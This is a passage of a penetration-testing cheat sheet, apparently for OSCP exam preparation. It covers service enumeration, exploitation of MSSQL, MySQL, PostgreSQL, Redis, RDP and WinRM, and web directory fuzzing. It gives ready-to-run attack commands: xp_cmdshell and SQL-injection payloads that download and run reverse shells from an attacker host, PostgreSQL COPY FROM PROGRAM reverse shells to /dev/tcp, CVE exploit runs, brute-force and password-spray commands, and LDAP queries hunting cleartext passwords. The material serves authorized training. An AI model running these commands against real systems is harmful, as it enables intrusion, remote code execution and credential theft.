ldapsearch -h &lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Searching terms
ldapsearch -H ldap://&lt;target_ip&gt; -x -D '&lt;domain&gt;\&lt;user&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "&lt;term&gt;"

# Specifies the value term to return
ldapsearch -H ldap://&lt;target_ip&gt; -x -D '&lt;domain&gt;\&lt;user&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "&lt;term&gt;" &lt;additionalTerm&gt;
</code></pre>
              <p><strong>Check Pre-Authentication for Users</strong></p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; --dc &lt;dc_ip&gt; &lt;userlist&gt;
</code></pre>

              <p><strong>Useful Search Terms</strong></p>
              <pre><code class="language-bash"># Search Terms to Find Cleartext Passwords
# Search for ms-MCS-AdmPwd (local administrator passwords)
(ms-MCS-AdmPwd=*)

# Search for attributes containing &#39;password&#39; in description
(description=*password*)

# Search for LAPS expiration time (to identify potential password management)
(ms-MCS-AdmPwdExpirationTime=*)

# Search for common weak passwords in attributes like description
(description=*(123456*|password*|qwerty*|letmein*))

# General LDAP Search Filters
# Search for All Users
(objectClass=user)

# Search for All Computers
(objectClass=computer)

# Search for All Groups
(objectClass=group)

# Search for Disabled Accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Search for Expired Accounts
(&amp; (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Search for Specific Group Membership
(&amp;(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Search for Users with Specific Attributes
# For users with a specific email domain
(mail=*@example.com)
# For users with a specific title
(title=Manager)

# Specific Attributes

# Search for Password Last Set
(pwdLastSet=*)

# Search for Accounts with Expired Passwords
(&amp; (objectClass=user)(pwdLastSet&lt;=0))

# Search for Accounts in a Specific Organizational Unit (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Search for Accounts with Kerberos Pre-Authentication Disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Search for Service Principal Names (SPNs)
(servicePrincipalName=*)

# Search for Delegated Users
(msDS-AllowedToDelegateTo=*)

# Search for Accounts with Privileges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Search for All Organizational Units
(objectClass=organizationalUnit)

# Search for Active Directory Certificate Services
(objectClass=cACertificate)

# Search for All Attributes of a Specific User
(sAMAccountName=username)

# Search for Accounts with Specific Notes or Descriptions
(description=*keyword*)

# Search for all objects in the directory
(objectClass=*)

# Search for service accounts
(objectCategory=serviceAccount)

# Search for accounts with specific group memberships (replace &#39;GroupName&#39;)
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Search for computer accounts
(objectClass=computer)

# Search for users in a specific organizational unit (replace &#39;OU=Users&#39;)
(ou=OU=Users,DC=domain,DC=com)

# Search for all accounts with specific attributes
(pwdLastSet=0)
</code></pre>

              <h4 id="1415-1433-mssql">1.4.15 1433: MSSQL</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;ip&gt;

# Enumerate MSSQL database information and configurations
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=&lt;username&gt;,mssql.password=&lt;password&gt;,mssql.instance-name=&lt;instance_name&gt; -sV -p 1433 &lt;target_ip&gt;
</code></pre>
              <p><strong>Crackmapexec</strong></p>
              <pre><code class="language-bash"># Check MSSQL service and execute command
crackmapexec mssql -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -x &quot;whoami&quot; &lt;target_ip&gt;

# Query databases and list them
crackmapexec mssql -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -x &quot;SELECT name FROM master.dbo.sysdatabases;&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Logging In</strong></p>
              <pre><code class="language-bash"># Connect to MSSQL using sqsh (Linux)
sqsh -S &lt;target_ip&gt; -U &lt;username&gt; -P &lt;password&gt;

# Connect to MSSQL using sqsh (Windows)
sqsh -S &lt;target_ip&gt; -U &lt;domain&gt;\\&lt;username&gt; -P &lt;password&gt; -D &lt;database&gt;
</code></pre>
              <p><strong>Exploitation</strong></p>
              <pre><code class="language-sql">-- Enable advanced options and xp_cmdshell for command execution
EXEC SP_CONFIGURE &#39;show advanced options&#39;, 1;
RECONFIGURE;
GO

EXEC SP_CONFIGURE &#39;xp_cmdshell&#39;, 1;
RECONFIGURE;
GO

-- Test xp_cmdshell to execute system commands
EXEC xp_cmdshell &#39;whoami&#39;;
GO

-- Download and execute a reverse shell
EXEC xp_cmdshell &#39;powershell &quot;Invoke-WebRequest -Uri http://&lt;attacker_ip&gt;:&lt;port&gt;/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe&quot;&#39;;
GO

EXEC xp_cmdshell &#39;c:\\Users\\Public\\reverse.exe&#39;;
GO
</code></pre>
              <pre><code class="language-sql">-- SQL Injection example to execute system commands
test&#39;; EXEC master.dbo.xp_cmdshell &#39;powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;&#39;http://&lt;attacker_ip&gt;:&lt;port&gt;/powercat.ps1&#39;&#39;);powercat -c &lt;attacker_ip&gt; -p &lt;port&gt; -e powershell&quot;&#39;;--
</code></pre>
              <p><strong>Database Usage</strong></p>
              <pre><code class="language-sql">-- List all the databases
SELECT name FROM master.dbo.sysdatabases
                
-- List all tables in the current database
SELECT * FROM information_schema.tables;

-- View contents of a specific table
SELECT * FROM &lt;table_name&gt;;

-- Search for specific data in a table
SELECT * FROM &lt;table_name&gt; WHERE &lt;column_name&gt; LIKE &#39;%&lt;search_term&gt;%&#39;;

-- Insert a new record into a table
INSERT INTO &lt;table_name&gt; (&lt;column1&gt;, &lt;column2&gt;) VALUES (&#39;&lt;value1&gt;&#39;, &#39;&lt;value2&gt;&#39;);

-- Update an existing record in a table
UPDATE &lt;table_name&gt; SET &lt;column_name&gt; = &#39;&lt;new_value&gt;&#39; WHERE &lt;condition&gt;;

-- Delete a record from a table
DELETE FROM &lt;table_name&gt; WHERE &lt;condition&gt;;
</code></pre>
              <h4 id="1416-2049-nfs">1.4.16 2049: NFS</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 2049 -sV --script &quot;nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client,disk,nfs-*&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumeration</strong></p>
              <pre><code class="language-bash"># Show all NFS shares on the target
showmount -e &lt;target_ip&gt;

# Show mount information for the target
showmount &lt;target_ip&gt;
</code></pre>
              <p><strong>Mounting</strong></p>
              <pre><code class="language-bash"># Create a local directory to mount the NFS share
mkdir &lt;mount_point&gt;

# Mount the NFS share
sudo mount -t nfs -o vers=&lt;version&gt;,nolock &lt;target_ip&gt;:&lt;share&gt; &lt;mount_point&gt;
</code></pre>
              <h4 id="1417-3003-cgms-possible">1.4.17 3003: CGMS (possible)</h4>
              <p><strong>Enumeration</strong></p>
              <pre><code class="language-bash"># Connect to the service
nc -nv &lt;target_ip&gt; 3003

# Get a list of available commands
help

# Check the version of the CGMS service
version
</code></pre>
              <p><strong>Exploitation (CVE-2020-13151)</strong>
                This exploit targets Aerospike&#39;s REST API to gain remote code execution. Ensure that you have
                authorization before using this.</p>
              <pre><code class="language-bash"># Download the exploit script
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py

# Run the exploit with appropriate parameters
python3 cve2020-13151.py --ahost=&lt;target_ip&gt; --aport=3000 --pythonshell --lhost=&lt;local_ip&gt; --lport=443

# Start a Netcat listener on your local machine
nc -nlvp 443
</code></pre>
              <p><strong>Possible Available Commands for Information Gathering</strong></p>
              <pre><code class="language-plaintext">bins
build
build_os
build_time
cluster-name
config-get
config-set
digests
dump-cluster
dump-fabric
dump-hb
dump-hlc
dump-migrates
dump-msgs
dump-rw
dump-si
dump-skew
dump-wb-summary
eviction-reset
feature-key
get-config
get-sl
health-outliers
health-stats
histogram
jem-stats
jobs
latencies
log
log-set
log-message
logs
mcast
mesh
name
namespace
namespaces
node
physical-devices
quiesce
quiesce-undo
racks
recluster
revive
roster
roster-set
service
services
services-alumni
services-alumni-reset
set-config
set-log
sets
show-devices
sindex
sindex-create
sindex-delete
sindex-histogram
statistics
status
tip
tip-clear
truncate
truncate-namespace
truncate-namespace-undo
truncate-undo
version
</code></pre>
              <h4 id="1418-3306-mysql">1.4.18 3306: MYSQL</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -sV -p 3306 --script &quot;mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Crackmapexec</strong></p>
              <pre><code class="language-bash">crackmapexec mysql -d &lt;database&gt; -u &lt;username&gt; -p &lt;password&gt; -x &quot;SHOW DATABASES;&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash"># Brute force MySQL login using Hydra
hydra -l &lt;username&gt; -P &lt;password_list&gt; -s 3306 -vV &lt;IP&gt; mysql
</code></pre>
              <p><strong>Loggin In</strong></p>
              <pre><code class="language-bash">mysql -h &lt;target_ip&gt; -u &lt;username&gt; -p &lt;database&gt;
</code></pre>
              <p><strong>Database Usage</strong></p>
              <pre><code class="language-sql">SHOW DATABASES;

USE &lt;database_name&gt;;

SHOW TABLES;

DESCRIBE &lt;table_name&gt;;

SELECT * FROM &lt;table_name&gt;;
</code></pre>
              <p><strong>Exploitation Examples</strong></p>
              <pre><code class="language-sql"># Database User Enumeration
SELECT user FROM mysql.user;

# Privilege Escalation
GRANT ALL PRIVILEGES ON *.* TO &#39;&lt;username&gt;&#39;@&#39;%&#39; WITH GRANT OPTION;
FLUSH PRIVILEGES;
</code></pre>

              <p><strong>Check System Permissions of the DB User</strong></p>
              <pre><code class="language-powershell"># 1. Copy an already existing file from Windows to another location.
SELECT LOAD_FILE(&#39;C:\\xampp\htdocs\\ncat.exe&#39;) INTO DUMPFILE &#39;C:\\xampp\\htdocs\\nc.exe&#39;;

# 2. Check the permissions of the new written file.
icacls &#39;C:\\xampp\htdocs\nc.exe&#39;

# An output like the one below indicates that the file was written with admin privileges, therefore the DB user has admin privilege (consider WerTrigger exploit for excalation).
nc.exe WinServer\\apache:(I)(F)  
    NT AUTHORITY\\SYSTEM:(I)(F)  
    BUILTIN\\Administrators:(I)(F)  
    BUILTIN\\Users:(I)(RX)  
Successfully processed 1 files; Failed processing 0 files
</code></pre>
              <h4 id="1419-3389-rdp">1.4.19 3389: RDP</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script &quot;rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner&quot; -p 3389 &lt;IP&gt;
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash">hydra -L &lt;user_list&gt; -P &lt;password_list&gt; -s 3389 rdp://&lt;IP&gt;
</code></pre>
              <p><strong>Password Spray</strong></p>
              <pre><code class="language-bash"># Using Crowbar
crowbar -b rdp -s &lt;target_ip&gt;/32 -U users.txt -C rockyou.txt

# Using CrackMapExec
crackmapexec rdp &lt;target_ip&gt; -u users.txt -p rockyou.txt
</code></pre>
              <p><strong>Logging In</strong></p>
              <pre><code class="language-bash"># Connect using xfreerdp with various options
xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:&lt;IP&gt; /u:&lt;username&gt; /p:&lt;password&gt;

# Connect with a drive mapping and increased timeout
xfreerdp /u:&lt;username&gt; /v:&lt;IP&gt; /cert:ignore /p:&lt;password&gt; /timeout:20000 /drive:&lt;drive_name&gt;,&lt;local_path&gt;

# Connect with clipboard support and set resolution
xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:&lt;ip&gt; +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop

# Connect using rdesktop with credentials
rdesktop -u $USER -p $PASSWORD -g 1920x1080 &lt;ip&gt;

# Connect using rdesktop without credentials
rdesktop &lt;ip&gt;
</code></pre>
              <h4 id="1420-5432-5433-postgresql">1.4.20 5432, 5433: PostgreSQL</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -sV -p 5432,5433 --script &quot;postgresql-info,postgresql-user-enum,postgresql-ssl&quot; &lt;ip&gt;
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash">hydra -L users.txt -P passwords.txt -s 5432 &lt;ip&gt; postgresql
</code></pre>
              <p><strong>Password Spraying</strong></p>
              <pre><code class="language-bash">crackmapexec postgres -d &lt;DB_NAME&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -t &lt;ip&gt;
</code></pre>
              <p><strong>Logging In</strong></p>
              <pre><code class="language-bash"># -W: Prompt for password
psql -h &lt;ip&gt; -p 5432 -U &lt;USER&gt; -W
</code></pre>
              <p><strong>RCE</strong></p>
              <pre><code class="language-bash"># RCE is possible for versions: PostgreSQL DB 11.3 - 11.9

# Run the exploit script to gain remote code execution
python3 50847.py -i &lt;ip&gt; -p 5437 -c &quot;busybox nc $ATTACKER_IP 80 -e sh&quot;
</code></pre>
              <p><strong>Code Execution</strong></p>
              <pre><code class="language-bash">#POC  
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM &#39;id&#39;;  
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;

#Reverse Shell
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM &#39;sh -i &gt;&amp; /dev/tcp/$KaliIP/8080 0&gt;&amp;1&#39;;
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;
</code></pre>
              <p><strong>Database Usage</strong></p>
              <pre><code class="language-sql"># List all databases
\l

# Switch to a specific database
\c &lt;DB_NAME&gt;

# List all tables in the current database
\dt

# View the schema of a specific table
\d &lt;TABLE_NAME&gt;

# Query the contents of a specific table
SELECT * FROM &lt;TABLE_NAME&gt;;

# Get detailed information about a table, including columns and their types
\d+ &lt;TABLE_NAME&gt;

# Execute a query to find specific data, such as users with a particular attribute
SELECT * FROM users WHERE attribute = &#39;value&#39;;

# Example command to list all tables and their columns
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = &#39;public&#39;;

# Execute an SQL command to create a new table
CREATE TABLE test_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

# Insert data into a table
INSERT INTO test_table (name) VALUES (&#39;example_data&#39;);

# Update data in a table
UPDATE test_table SET name = &#39;updated_data&#39; WHERE id = 1;

# Delete data from a table
DELETE FROM test_table WHERE id = 1;
</code></pre>
              <h4 id="1421-5900-vnc-virtual-network-computing">1.4.21 5900: VNC (Virtual Network Computing)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 5900 --script vnc-info,vnc-auth-bypass &lt;ip&gt;
</code></pre>
              <p><strong>Connecting</strong></p>
              <pre><code class="language-bash"># Use vncviewer or tigervnc to connect to a VNC server
vncviewer &lt;ip&gt;:5900

# More detailed connection with authentication
vncviewer -passwd /path/to/passwordfile &lt;ip&gt;:5900
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash">hydra -L &lt;user_list&gt; -P &lt;password_list&gt; vnc://&lt;ip&gt;
</code></pre>
              <p><strong>Common Default Credentials</strong></p>
              <pre><code class="language-plaintext">No Password
vnc
1234
</code></pre>
              <p><strong>Usage Once Connected</strong></p>
              <pre><code class="language-plaintext">1. Explore the filesystem
2. Run commands
3. Capture screenshots with scrot
4. Manipulate files
</code></pre>
              <h4 id="1422-5985-5986-winrm">1.4.22 5985, 5986: WinRM</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 5985,5986 --script winrm-info &lt;ip&gt;
</code></pre>
              <p><strong>Crackmapexec</strong></p>
              <pre><code class="language-bash">crackmapexec winrm &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <p><strong>Loggin In</strong></p>
              <pre><code class="language-powershell"># Using PowerShell to connect to WinRM
Enter-PSSession -ComputerName &lt;ip&gt; -Credential (Get-Credential)
</code></pre>
              <p><strong>Exploitation</strong></p>
              <pre><code class="language-bash"># using Kali to connect to WinRM
evil-winrm -i &lt;ip&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <h4 id="1423-6379-redis">1.4.23 6379: Redis</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 6379 --script &quot;redis-info,redis-rce&quot; &lt;ip&gt;
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash">redis-cli -h &lt;ip&gt; -p 6379 -a &lt;password_to_try&gt;
</code></pre>
              <p><strong>Exploit</strong></p>
              <pre><code class="language-bash"># Search for known Redis vulnerabilities and exploitation techniques
searchsploit redis

# Run a Redis rogue server to capture data or execute commands
python3 redis-rogue-server.py -p 6379

# Run Redis RCE exploit using a custom script (replace &#39;payload&#39; with the desired payload)
python3 redis-rce-exploit.py -h &lt;ip&gt; -p 6379 -c &quot;payload&quot;
</code></pre>
              <p><strong>Connect and Interact</strong></p>
              <pre><code class="language-bash"># Connect to Redis server
redis-cli -h &lt;ip&gt; -p 6379

# After connecting, list databases and their keys
info
keys *
select &lt;db_number&gt; # select database number (0 by default)

# Example of running commands
set mykey myvalue
get mykey

config get *  # View all configuration options
shutdown      # Shutdown the Redis server
</code></pre>
              <p><strong>Redis Pentesting Reference:</strong> <a
                  href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a>
              </p>
              <p><strong>Redis Rogue Server GitHub:</strong> <a
                  href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>
              </p>
              <p><strong>Redis RCE:</strong> <a
                  href="https://github.com/jas502n/Redis-RCE?tab=readme-ov-file">https://github.com/jas502n/Redis-RCE?tab=readme-ov-file</a>
              </p>
              <h4 id="1424-unkown-port">1.4.24 Unkown Port</h4>
              <p><strong>Enumeration</strong></p>
              <pre><code class="language-bash"># Connect to the unknown port to identify the service
nc -nv &lt;IP&gt; &lt;PORT&gt;
</code></pre>
              <p><strong>Interaction</strong></p>
              <pre><code class="language-bash"># Always list available commands or options to gather more information about the service
help
</code></pre>
              <p><strong>Usage Examples</strong></p>
              <pre><code class="language-bash"># Attempt to login with known or guessed credentials
# You may need to replace &lt;USERNAME&gt; and &lt;PASSWORD&gt; with appropriate values
echo -e &quot;&lt;USERNAME&gt;\n&lt;PASSWORD&gt;&quot; | nc -nv &lt;IP&gt; &lt;PORT&gt;

# If the service provides command options or help output, use these to guide further actions
# For example, if the service has commands like &#39;list&#39;, &#39;status&#39;, or &#39;config&#39;, use those
echo &quot;list&quot; | nc -nv &lt;IP&gt; &lt;PORT&gt;
</code></pre>
              <p><strong>Service Specific Actions</strong></p>
              <pre><code class="language-bash"># After identifying the service, refer to its documentation or default command set
# For example, if the service is a management tool, commands might include listing users or querying configurations

# Example commands might include:
# - Listing users or available configurations
# - Executing administrative commands if applicable
# - Gathering information about the service status or configuration

# Replace with appropriate commands based on the identified service and help output
</code></pre>

              <h2 id="2-vulnerability-scanning">2. <span class="emoji">üîé</span> Vulnerability Scanning</h2>
              <h3 id="21-nessus">2.1 Nessus</h3>
              <p class="text-danger font-weight-bold">
                <strong>Note:</strong> The use of Nessus is <em><u>forbidden</u></em> during the exam. This tool
                should be used only in your personal lab environment for practice purposes.
              </p>
              <p>Nessus is a powerful vulnerability scanning tool that can identify vulnerabilities, misconfigurations,
                and compliance issues. Here&#39;s how you can install and set it up:</p>
              <ol>
                <li><strong>Download Nessus</strong></li>
              </ol>
              <pre><code class="language-plaintext">Go to the Nessus website https://www.tenable.com/downloads/nessus?loginAttempted=true and select the platform.

Download the installer to your local machine.
</code></pre>
              <ol start="2">
                <li><strong>Verify the Download</strong></li>
              </ol>
              <pre><code class="language-bash">#  It&#39;s important to verify the integrity of the download with `sha256sum`.
cd ~/Downloads
echo &quot;[sha256_sum_found_in_website] Nessus-10.5.0-debian10_amd64.deb&quot; &gt; sha256sum_nessus
sha256sum -c sha256sum_nessus

# Expected Output: OK
</code></pre>
              <ol start="3">
                <li><strong>Install Nessus</strong></li>
              </ol>
              <pre><code class="language-bash">sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
</code></pre>
              <ol start="4">
                <li><strong>Start Nessus</strong></li>
              </ol>
              <pre><code class="language-bash">sudo systemctl start nessusd.service

# Then, visit the Nessus GUI at https://127.0.0.1:8834 to configure the scanner.
</code></pre>
              <h3 id="22-nmap-nse-nmap-scripting-engine">2.2 Nmap NSE (Nmap Scripting Engine)</h3>
              <p>Nmap&#39;s NSE is a versatile tool that allows you to extend Nmap&rsquo;s capabilities with custom
                scripts.
                By utilizing these tools effectively, you can identify vulnerabilities in your environment or during
                penetration testing engagements. However, remember to always follow ethical guidelines and ensure that
                you have proper authorization before scanning any systems.</p>
              <ol>
                <li><strong>Basic Usage</strong></li>
              </ol>
              <pre><code class="language-bash"># Run specific script
nmap --script [scriptName] [IP]

# Get help on what a script does
nmap --script-help [scriptName]
</code></pre>
              <ol start="2">
                <li><strong>Script Management</strong></li>
              </ol>
              <pre><code class="language-bash"># Scripts are located in /usr/share/nmap/scripts; we can add new scripts by copying them into this directory
sudo cp /path/to/script.nse /usr/share/nmap/scripts/

# Update the script database
sudo nmap --script-updatedb

# Usage example
sudo nmap -sV -p 443 --script &quot;http-vuln-cve2021-41773&quot; 192.168.145.23
</code></pre>

              <h2 id="3-web-applications">3. <span class="emoji">üï∑Ô∏è</span> Web Applications</h2>
              <h3 id="31-enumeration">3.1 Enumeration</h3>
              <h4 id="311-fingerprinting">3.1.1 FingerPrinting</h4>
              <p><strong>Web Technology Detection</strong></p>
              <pre><code class="language-bash"># Detect technologies used by the target website
whatweb -a 3 [TARGET_IP]

# Scan for potential vulnerabilities and server misconfigurations
nikto -ask=no -h http://[TARGET_IP] 2&gt;&amp;1

whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2&gt;&amp;1

# When find an HTTP website always try to do a post on the get requests you find to see what happens

# Obtain SSL certificate information
openssl s_client -connect &lt;target_domain&gt;:443
</code></pre>
              <p><strong>HTTP Methods Testing</strong></p>
              <pre><code class="language-bash"># When discovering an HTTP website, test various HTTP methods to identify potential vulnerabilities. Use the following command to enumerate allowed methods:
curl -X OPTIONS http://[TARGET_IP] -i

# Then, try POST requests or other methods found to see how the server responds:
curl -X POST http://[TARGET_IP]/[endpoint] -d &quot;test=data&quot;
</code></pre>
              <p><strong>Advanced Fingerprinting Tools</strong></p>
              <pre><code class="language-bash"># Use Wappalyzer to identify technologies and frameworks
wappalyzer --url http://[TARGET_IP]

# Use BuiltWith to gather detailed technology profile
builtwith [TARGET_IP]

# Scan for additional information using HTTP headers
curl -I http://[TARGET_IP]
</code></pre>
              <h4 id="312-directory-discovery">3.1.2 Directory Discovery</h4>
              <h5 id="3121-ffuf">3.1.2.1 FFUF</h5>
              <pre><code class="language-bash"># Basic directory fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filter to show only 200 or 3xx responses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Output results to a file
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Recursive directory fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion

# Set number of threads
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Use proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080

# Use a delay between requests
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5

# Set request timeout
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10

# Match response size
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242

# Example usage
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
</code></pre>
              <h5 id="3122-dirb">3.1.2.2 DIRB</h5>
              <pre><code class="language-bash"># Basic directory scanning
dirb http://target /path/to/wordlist.txt

# Save output to a file
dirb http://target /path/to/wordlist.txt -o results.txt

# Use custom user-agent
dirb http://target /path/to/wordlist.txt -a &quot;Mozilla/5.0&quot;

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -N

# Scan SSL (HTTPS)
dirb https://target /path/to/wordlist.txt

# Recursively scan directories
dirb http://target /path/to/wordlist.txt -r

# Exclude specific status codes
dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt

# Example usage
dirb http://target.com
</code></pre>
              <h5 id="3123-gobuster">3.1.2.3 GOBUSTER</h5>
              <pre><code class="language-bash"># Basic directory scanning
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Example usage
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x pdf
</code></pre>
              <h5 id="3124-feroxbuster">3.1.2.4 FEROXBUSTER</h5>
              <pre><code class="language-bash"># Basic directory fuzzing
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Set number of threads, verbose mode, ignore certificate errors
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;txt,html,php,asp,aspx,jsp&quot; -v -k -n -e 

# Filter specific status codes
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;txt,html,php,asp,aspx,jsp&quot; -v -k -n -e -C 404 #ignore denied
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;txt,html,php,asp,aspx,jsp&quot; -v -k -n -e -C 404,302 #handle redirects
</code></pre>
              <h5 id="3125-dirsearch">3.1.2.5 DIRSEARCH</h5>
              <pre><code class="language-bash"># Basic directory scanning
dirsearch -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 or 3xx responses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Specify extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Save output to a file
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Set number of threads
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080

# Ignore SSL certificate warnings
dirsearch -u https://target -w /path/to/wordlist.txt -k

# Exclude specific status codes
dirsearch -u http://target -w /path/to/wordlist.txt --exclude-status 404,403

# Example usage
dirsearch -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 
dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 300 --recursive --exclude-status=400,404,405,408
</code></pre>
              <h5 id="3126-wfuzz">3.1.2.6 WFUZZ</h5>
              <pre><code class="language-bash"># Find available directories
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://&lt;target_ip&gt;/FUZZ

# Find available directories with cookies
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H &quot;cookie: &lt;cookie_name&gt;=&lt;cookie_value&gt;&quot; http://&lt;target_ip&gt;/FUZZ

# Fuzz data parameters
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d &quot;id=FUZZ&amp;catalogue=1&quot; http://&lt;target_ip&gt;

# Subdomain enumeration
wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H &quot;HOST: FUZZ.&lt;target_domain&gt;&quot; &lt;target_domain&gt;

# Enumerate hidden directories
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://&lt;target_ip&gt;/.FUZZ

